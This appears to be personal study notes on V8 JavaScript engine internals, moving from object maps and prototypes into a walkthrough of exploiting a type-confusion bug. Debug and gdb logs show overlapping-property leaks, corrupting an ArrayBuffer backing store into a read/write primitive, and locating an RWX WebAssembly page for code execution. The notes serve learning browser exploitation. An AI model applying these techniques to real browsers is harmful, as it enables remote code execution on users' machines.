# Two object with the same Map will also have the same prototype object

```shell
V8 version 11.9.0 (candidate)
d8> function Bar(x) {this.x = x;}
undefined

d8> Bar.prototype.getX = function getX() {return this.x;};
function getX() {return this.x;}

d8> const foo = new Bar(true);
undefined

d8> %DebugPrint(foo)
DebugPrint: 0x7700024cdad: [JS_OBJECT_TYPE]
 - map: 0x07700011b28d <Map[48](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x07700024ccc9 <Object map = 0x7700011b265>
 - elements: 0x077000000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x077000000219 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x77000002bdd: [String] in ReadOnlySpace: #x: 0x077000000ddd <true> (const data field 0), location: in-object
}

d8> const qux = new Bar(false);
{x: false}

d8> %DebugPrint(qux)
DebugPrint: 0x7700024d0dd: [JS_OBJECT_TYPE]
 - map: 0x07700011b28d <Map[48](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x07700024ccc9 <Object map = 0x7700011b265>
 - elements: 0x077000000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x077000000219 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x77000002bdd: [String] in ReadOnlySpace: #x: 0x077000000df9 <false> (const data field 0), location: in-object
}
```

# Prototypes are just objects in JavaScript

```shell
d8> %DebugPrintPtr(0x07700024ccc9)    
DebugPrint: 0x7700024ccc9: [JS_OBJECT_TYPE] <-- just an object
 - map: 0x07700011b265 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x077000104ae1 <Object map = 0x7700010411d>
 - elements: 0x077000000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x077000000f71 <PropertyArray[0]>
 - All own properties (excluding elements): {
    0x77000006105: [String] in ReadOnlySpace: #constructor: 0x077000119d95 <JSFunction Bar (sfi = 0x77000119ccd)> (const data field 0), location: in-object
    0x7700011ae95: [String] in OldSpace: #getX: 0x07700011b051 <JSFunction getX (sfi = 0x7700011af01)> (const data field 1), location: in-object
}
```

Its map:

```shell
d8> %DebugPrintPtr(0x7700010411d)
DebugPrint: 0x7700010411d: [Map] in OldSpace
 - type: JS_OBJECT_PROTOTYPE_TYPE
 - instance size: 28
 - inobject properties: 4
 - unused property fields: 2
 - elements kind: HOLEY_ELEMENTS
 - enum length: 0
 - stable_map
 - prototype_map
 - prototype info: 0x077000104ac5 <PrototypeInfo>
 - prototype_validity cell: 0x077000000add <Cell value= 1>
 - instance descriptors (own) #12: 0x077000104961 <DescriptorArray[12]>
 - prototype: 0x077000000235 <null>
 - constructor: 0x077000104625 <JSFunction Object (sfi = 0x77000322f55)>
 - dependent code: 0x077000000229 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

# Change the prototype object of an object

```shell
d8> let obj = {x: 1, y: {a: 1}};
undefined

d8> %DebugPrint(obj)
DebugPrint: 0x2b4f5e277c1: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x2a3e867f4361 <Map[40](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0ea3dee970f9 <Object map = 0xf58b5541b61>
 - elements: 0x10e3dedc0259 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x10e3dedc0259 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x10e3dedc38c1: [String] in ReadOnlySpace: #x: 1 (const data field 0), location: in-object
    0x10e3dedc38d9: [String] in ReadOnlySpace: #y: 0x02b4f5e277e9 <Object map = 0x2a3e867f4319> (const data field 1), location: in-object
}

d8> obj.__proto__.x = 1
1

d8> %DebugPrint(obj)
DebugPrint: 0x2b4f5e277c1: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x2a3e867f4361 <Map[40](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0ea3dee970f9 <Object map = 0x27eec3dd4be1> <--------- shape of the prototype object has changed
 - elements: 0x10e3dedc0259 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x10e3dedc0259 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x10e3dedc38c1: [String] in ReadOnlySpace: #x: 1 (const data field 0), location: in-object
    0x10e3dedc38d9: [String] in ReadOnlySpace: #y: 0x02b4f5e277e9 <Object map = 0x2a3e867f4319> (const data field 1), location: in-object
}

d8> %DebugPrintPtr(0x27eec3dd4be1)
DebugPrint: 0x27eec3dd4be1: [Map] in OldSpace
 - type: JS_OBJECT_PROTOTYPE_TYPE
 - instance size: 56
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 1
 - enum length: invalid
 - stable_map
 - prototype_map
 - prototype info: 0x0f58b5555161 <PrototypeInfo>
 - prototype_validity cell: 0x27eec3dd50b9 <Cell value= 0>
 - instance descriptors (own) #13: 0x2a3e867ed779 <DescriptorArray[13]>
 - prototype: 0x10e3dedc0269 <null>
 - constructor: 0x0f58b5554b61 <JSFunction Object (sfi = 0x1f0d8618c641)>
 - dependent code: 0x10e3dedc0181 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
0x10e3dedc0061: [Map] in ReadOnlySpace
 - type: MAP_TYPE
 - instance size: 72
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - non-extensible
 - back pointer: 0x10e3dedc04e9 <undefined> <---- the new Map is not transitioned from the old Map of the prototype object
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x10e3dedc0199 <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x10e3dedc0269 <null>
 - constructor: 0x10e3dedc0269 <null>
 - dependent code: 0x10e3dedc0181 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

# Create an object from `Object.create` using an existing object as the prototype

```shell
d8> let obj = {x:13};
undefined

d8> %DebugPrint(obj)
DebugPrint: 0x24370024b009: [JS_OBJECT_TYPE]
 - map: 0x243700119d81 <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x243700104ae1 <Object map = 0x24370010411d>
 - elements: 0x243700000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x243700000219 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x243700002bdd: [String] in ReadOnlySpace: #x: 13 (const data field 0), location: in-object
}

d8> Object.create(obj);
{}

d8> %DebugPrint(obj)
DebugPrint: 0x24370024b009: [JS_OBJECT_TYPE]
 - map: 0x24370011b1fd <Map[16](HOLEY_ELEMENTS)> [DictionaryProperties] <---- the Map has changed from FastProperties to DictionaryProperties
 - prototype: 0x243700104ae1 <Object map = 0x24370010411d>
 - elements: 0x243700000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x24370024ce85 <NameDictionary[18]> <---- the backing store of properties has changed from FixedArray to NameDictionary
 - All own properties (excluding elements): {
   x: 13 (data, dict_index: 1, attrs: [WEC])
}
```

# Out-of-line property

```shell
Welcome to Node.js v18.18.2.
Type ".help" for more information.
> let a = {x: 1}
undefined

> %DebugPrint(a)
DebugPrint: 0x2b507ed4be1: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x0f5b4179d019 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x254b96fed1d9 <Object map = 0x9a62cec1251>
 - elements: 0x12a6205c1329 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x12a6205c1329 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x180ee9f9b541: [String] in OldSpace: #x: 1 (const data field 0), location: in-object
 }
0xf5b4179d019: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 32
 - inobject properties: 1
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x09a62cec6fb1 <Map(HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x180ee9fb7a71 <Cell value= 1>
 - instance descriptors (own) #1: 0x02b507ed63a9 <DescriptorArray[1]>
 - prototype: 0x254b96fed1d9 <Object map = 0x9a62cec1251>
 - constructor: 0x254b96fcf6e9 <JSFunction Object (sfi = 0x30969397ddf9)>
 - dependent code: 0x12a6205c1251 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

{ x: 1 }
> a.y = 2
2
> %DebugPrint(a)
DebugPrint: 0x2b507ed4be1: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x0f5b4178ebb9 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x254b96fed1d9 <Object map = 0x9a62cec1251>
 - elements: 0x12a6205c1329 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x3a174d349bd9 <PropertyArray[3]>
 - All own properties (excluding elements): {
    0x180ee9f9b541: [String] in OldSpace: #x: 1 (const data field 0), location: in-object
    0x180ee9f9b559: [String] in OldSpace: #y: 2 (const data field 1), location: properties[0]
 }
0xf5b4178ebb9: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 32
 - inobject properties: 1
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 2
 - enum length: invalid
 - stable_map
 - back pointer: 0x0f5b4179d019 <Map(HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x254b96fc9631 <Cell value= 0>
 - instance descriptors (own) #2: 0x3a174d349b91 <DescriptorArray[2]>
 - prototype: 0x254b96fed1d9 <Object map = 0x9a62cec1251>
 - constructor: 0x254b96fcf6e9 <JSFunction Object (sfi = 0x30969397ddf9)>
 - dependent code: 0x12a6205c1251 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

# Object with an inline and an out-of-line property before and after the transition

```shell
> function vuln(e){return e.a,%DebugPrint(e),Object.create(e),%DebugPrint(e),e.b}
undefined

> let obj = {a:42}
undefined

> obj.b = 43
43

> vuln(obj)
DebugPrint: 0x3488f1c49a31: [JS_OBJECT_TYPE]
 - map: 0x3c6f09d82841 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x3faf54b6d1d9 <Object map = 0x3c6f09d81251>
 - elements: 0x3a4489781329 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x3488f1c4a959 <PropertyArray[3]>
 - All own properties (excluding elements): {
    0x3a448978a011: [String] in ReadOnlySpace: #a: 42 (const data field 0), location: in-object
    0x3a448978a0d1: [String] in ReadOnlySpace: #b: 43 (const data field 1), location: properties[0]
 }

DebugPrint: 0x3488f1c49a31: [JS_OBJECT_TYPE]
 - map: 0x3c6f09d828d1 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x3faf54b6d1d9 <Object map = 0x3c6f09d81251>
 - elements: 0x3a4489781329 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x3a95a8f235b9 <NameDictionary[29]>
 - All own properties (excluding elements): {
   a: 42 (data, dict_index: 1, attrs: [WEC])
   b: 43 (data, dict_index: 2, attrs: [WEC])
 }
```

# Overwrite backing storage of ArrayBuffer

Leak `ArrayBuffer` address:

```shell
[+] Finding Overlapping Properties
[+] Properties p10 and p9 overlap!
[+] Leaking ArrayBuffer address...
[+] Object Address: 0x251d66b0d898
DebugPrint: 0x251d66b0d899: [JSArrayBuffer] in OldSpace
 - map: 0x265c3ec04371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1095c5590fd1 <Object map = 0x265c3ec043c1>
 - elements: 0x1881dfc82cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x577a27c2c280
 - byte_length: 1024
 - neuterable
 - properties: 0x1881dfc82cf1 <FixedArray[0]> {}
 - embedder fields = {
    (nil)
    (nil)
 }
```

Overwrite `ArrayBuffer` backing store with `0x13371337`:

```shell
[+] Corrupting ArrayBuffer backing storage address ...
[+] Original Leaked Data: 0x577a27c2c280
DebugPrint: 0x251d66b0d899: [JSArrayBuffer] in OldSpace
 - map: 0x265c3ec04371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1095c5590fd1 <Object map = 0x265c3ec043c1>
 - elements: 0x1881dfc82cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x13371337
 - byte_length: 1024
 - neuterable
 - properties: 0x1881dfc82cf1 <FixedArray[0]> {}
 - embedder fields = {
    (nil)
    (nil)
 }
```

Leak address of buffer 2 and point to from buffer 1:

```shell
[+] Finding Overlapping Properties
[+] Properties p10 and p21 overlap!
[+] Leaking ArrayBuffer2 address...
[+] Object Address: 0x1dc32a0d898
DebugPrint: 0x1dc32a0d899: [JSArrayBuffer] in OldSpace
 - map: 0x195b1b484371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x21f516710fd1 <Object map = 0x195b1b4843c1>
 - elements: 0x0b03aac02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x63a24ca307e0
 - byte_length: 1024
 - neuterable
 - properties: 0x0b03aac02cf1 <FixedArray[0]> {}
 - embedder fields = {
    (nil)
    (nil)
}

[+] Corrupting ArrayBuffer1 backing storage address ...
[+] Original Leaked Data: 0x63a24ca303d0
DebugPrint: 0x1dc32a0d8d9: [JSArrayBuffer] in OldSpace
 - map: 0x195b1b484371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x21f516710fd1 <Object map = 0x195b1b4843c1>
 - elements: 0x0b03aac02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x1dc32a0d898 <-- address of array buffer 2
 - byte_length: 1024
 - neuterable
 - properties: 0x0b03aac02cf1 <FixedArray[0]> {}
 - embedder fields = {
    (nil)
    (nil)
}
```

The forth element of backing storage of buffer 1 will point to the backing storage of buffer 2:

```shell
[+] Finding Overlapping Properties
[+] Properties p19 and p17 overlap!
[+] Leaking ArrayBuffer 2 address...
[+] ArrayBuffer 2 address: 0x21866040d898
[+] Corrupting ArrayBuffer 1 backing storage address ...
[+] Original ArrayBuffer 1 backing store: 0x620cbd83af80
[+] ArrayBuffer 2 Backing Store: 0x620cbd842120 <-- get from the forth element of the backing store of buffer 1
DebugPrint: 0x21866040d899: [JSArrayBuffer] in OldSpace
 - map: 0x1a0303d04371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x084447410fd1 <Object map = 0x1a0303d043c1>
 - elements: 0x08f78da82cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x620cbd842120 <-- it matches
 - byte_length: 1024
 - neuterable
 - properties: 0x08f78da82cf1 <FixedArray[0]> {}
 - embedder fields = {
    (nil)
    (nil)
 }
```

Write to the default backing store of the second array buffer:

```shell
[+] Finding Overlapping Properties
[+] Properties p10 and p24 overlap!
[+] Leaking ArrayBuffer 2 address...
[+] ArrayBuffer 2 address: 0x26fddbb0d878
[+] Corrupting ArrayBuffer 1 backing storage address ...
[+] Original ArrayBuffer 1 backing store: 0x5fa6617f4a80
[+] Original ArrayBuffer 2 backing store: 0x5fa6617ede40
[+] Constructed Memory Read and Write Primitive!
[+] Read data from 2nd buffer: 0x13371337
V8 version 7.1.0 (candidate)
d8>
gef➤  x/10x 0x5fa6617ede40
0x5fa6617ede40: 0x13371337      0x00000000      0x00000000      0x00000000
0x5fa6617ede50: 0x00000000      0x00000000      0x00000000      0x00000000
0x5fa6617ede60: 0x00000000      0x00000000
```

# Gaining Code Execution

```shell
gef➤  xinfo 0x5fa6617ede40
─────────────────────────────── xinfo: 0x5fa6617ede40 ───────────────────────────────
Page: 0x00005fa661752000  →  0x00005fa66183c000 (size=0xea000)
Permissions: rw-
Pathname: [heap]
Offset (from page): 0x9be40
Inode: 0
```

As we can see, the memory of backing storage of the second buffer is read-write only.

A sample `WasmInstanceObject`:

```shell
d8> %DebugPrint(wasmInstance)
DebugPrint: 0x27f3161a3009: [WasmInstanceObject] in OldSpace
 - map: 0x1cbf2cd0b5d1 <Map(HOLEY_ELEMENTS)>
 - module_object: 0x3ca3bef8e879 <Module map = 0x1cbf2cd0b031>
 - exports_object: 0x3ca3bef8ea61 <Object map = 0x1cbf2cd0cb61>
 - native_context: 0x27f316183ea9 <NativeContext[248]>
 - memory_object: 0x27f3161a3109 <Memory map = 0x1cbf2cd0bfd1>
 - imported_function_instances: 0x27490d482cf1 <FixedArray[0]>
 - imported_function_callables: 0x27490d482cf1 <FixedArray[0]>
 - managed_native_allocations: 0x3ca3bef8e9f1 <Foreign>
 - memory_start: 0x7ea8eb000000
 - memory_size: 65536
 - memory_mask: ffff
 - imported_function_targets: 0x5ff7ea2d8c80
 - globals_start: (nil)
 - imported_mutable_globals: 0x5ff7ea2d8ca0
 - indirect_function_table_size: 0
 - indirect_function_table_sig_ids: (nil)
 - indirect_function_table_targets: (nil)
0x1cbf2cd0b5d1: [Map]
 - type: WASM_INSTANCE_TYPE
 - instance size: 256
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x27490d4825a1 <undefined>
 - prototype_validity cell: 0x2e4f63e02201 <Cell value= 1>
 - instance descriptors (own) #0: 0x27490d482321 <DescriptorArray[2]>
 - layout descriptor: (nil)
 - prototype: 0x3ca3bef8b559 <Object map = 0x1cbf2cd0ca21>
 - constructor: 0x27f3161a1369 <JSFunction Instance (sfi = 0x27f3161a1331)>
 - dependent code: 0x27490d482391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0
```

Dump memory to find a RWX memory region:

```shell
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x000003ca6f629000 0x000003ca6f680000 0x0000000000000000 ---
0x000003ca6f680000 0x000003ca6f683000 0x0000000000000000 rw-
0x000003ca6f683000 0x000003ca6f684000 0x0000000000000000 ---
0x000003ca6f684000 0x000003ca6f6b7000 0x0000000000000000 r-x
0x000003ca6f6b7000 0x000003ca6f6ff000 0x0000000000000000 ---
0x000003ca6f6ff000 0x000003ca6f700000 0x0000000000000000 ---
0x000003ca6f700000 0x000003ca6f703000 0x0000000000000000 rw-
0x000003ca6f703000 0x000003ca6f704000 0x0000000000000000 ---
0x000003ca6f704000 0x000003ca6f77f000 0x0000000000000000 r-x
0x000003ca6f77f000 0x000003ca77629000 0x0000000000000000 ---
0x00001622a9c74000 0x00001622a9c7c000 0x0000000000000000 rw-
0x00001cbf2cd00000 0x00001cbf2cd80000 0x0000000000000000 rw-
0x0000208c04880000 0x0000208c04883000 0x0000000000000000 rw-
0x000021b6fa080000 0x000021b6fa100000 0x0000000000000000 rw-
0x000027490d480000 0x000027490d483000 0x0000000000000000 rw-
0x000027490d483000 0x000027490d500000 0x0000000000000000 r--
0x000027f316180000 0x000027f316200000 0x0000000000000000 rw-
0x00002e4f63e00000 0x00002e4f63e3c000 0x0000000000000000 rw-
0x00003ca3bef80000 0x00003ca3bf000000 0x0000000000000000 rw-
0x00003ce4f7dac000 0x00003ce4f7dad000 0x0000000000000000 rwx <-- here we go
```

We found it in the `WasmInstanceObject`:

```shell
gef➤  x/64x 0x27f3161a3009 - 1
0x27f3161a3008:	0x2cd0b5d1	0x00001cbf	0x0d482cf1	0x00002749
0x27f3161a3018:	0x0d482cf1	0x00002749	0xbef8e879	0x00003ca3
0x27f3161a3028:	0xbef8ea61	0x00003ca3	0x16183ea9	0x000027f3
0x27f3161a3038:	0x161a3109	0x000027f3	0x0d4825a1	0x00002749
0x27f3161a3048:	0x0d4825a1	0x00002749	0x0d4825a1	0x00002749
0x27f3161a3058:	0x0d4825a1	0x00002749	0x0d482cf1	0x00002749
0x27f3161a3068:	0x0d482cf1	0x00002749	0x0d4825a1	0x00002749
0x27f3161a3078:	0xbef8e9f1	0x00003ca3	0x0d4825a1	0x00002749
0x27f3161a3088:	0x0d4825a1	0x00002749	0x0d4822a1	0x00002749
0x27f3161a3098:	0x6f6a7021	0x000003ca	0xeb000000	0x00007ea8
0x27f3161a30a8:	0x00010000	0x00000000	0x0000ffff	0x00000000
0x27f3161a30b8:	0xea25e0f8	0x00005ff7	0xea266188	0x00005ff7
0x27f3161a30c8:	0xea266178	0x00005ff7	0xea2d8c80	0x00005ff7
0x27f3161a30d8:	0x00000000	0x00000000	0xea2d8ca0	0x00005ff7
0x27f3161a30e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x27f3161a30f8:	0xf7dac000	0x00003ce4	0x00000000	0x00002749
                  ^^^^^^^^^^^^^^^^^^^^^^
                          Here
```

The offset is:

```shell
gef➤  p/u 0x27f3161a30f8 - (0x27f3161a3009 - 1)
$2 = 240
```

Format `u` is for unsigned decimal.

This offset is same with the blog.

# WebAssembly

Using [`wabt`](https://github.com/WebAssembly/wabt?tab=readme-ov-file) for dealing with conversions stuff.

Binary format:

```js
var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
```

Text format:

```js
(module
  (type $t0 (func (result i32)))
  (func $main (export "main") (type $t0) (result i32)
    (i32.const 42))
  (table $T0 0 funcref)
  (memory $memory (export "memory") 1))
```

# New stable `addrOf`

We can’t use our `addrOf` primitive to leak the object address anymore. The reason for this is that the `addrOf` primitive abuses our bug by overwriting the overlapping properties. This essentially would destroy our memory read/write primitive that we set up via our array buffers, resulting in writing to wrong memory regions and potentially causing a crash. <-- QUESTION: Still not get how `addrOf` can destroy the memory read/write primitive.

Add an out-of-line property to the `ArrayBuffer` will add an element to `properties`:

```shell
d8> let arrBuf1 = new ArrayBuffer(1024);
undefined
d8> let obj = {x:1}
undefined
d8> arrBuf1.leakme = obj;
{x: 1}
d8> %DebugPrint(arrBuf1)
DebugPrint: 0x25f2b618e189: [JSArrayBuffer]
 - map: 0x3a0922d0c9d1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x051a54910fd1 <Object map = 0x3a0922d043c1>
 - elements: 0x022424102cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x581a47187510
 - byte_length: 1024
 - neuterable
 - properties: 0x25f2b6190181 <PropertyArray[3]> {
    #leakme: 0x25f2b6190081 <Object map = 0x3a0922d0c981> (data field 0) properties[0]
 }
 - embedder fields = {
    (nil)
    (nil)
}
```

Memory of `arrBuf1`:

```shell
gef➤  x/16x 0x25f2b618e189 - 1
0x25f2b618e188:	0x22d0c9d1	0x00003a09	0xb6190181	0x000025f2
0x25f2b618e198:	0x24102cf1	0x00000224	0x00000400	0x00000000
0x25f2b618e1a8:	0x47187510	0x0000581a	0x00000002	0x00000000
0x25f2b618e1b8:	0x00000000	0x00000000	0x00000000	0x00000000
```

Memory of `properties`:

```shell
gef➤  x/16x 0x25f2b6190181 - 1
0x25f2b6190180:	0x24103899	0x00000224	0x00000000	0x00000003
0x25f2b6190190:	0xb6190081	0x000025f2	0x241025a1	0x00000224
                  ^^^^^^^^^^^^^^^^^^^^^^
                  The address of the object
0x25f2b61901a0:	0x241025a1	0x00000224	0x22d04fa1	0x00003a09
0x25f2b61901b0:	0x24102cf1	0x00000224	0xb6190319	0x000025f2
```

So, essentially, the property of `properties` field or PropertyArray is just an inline-property.





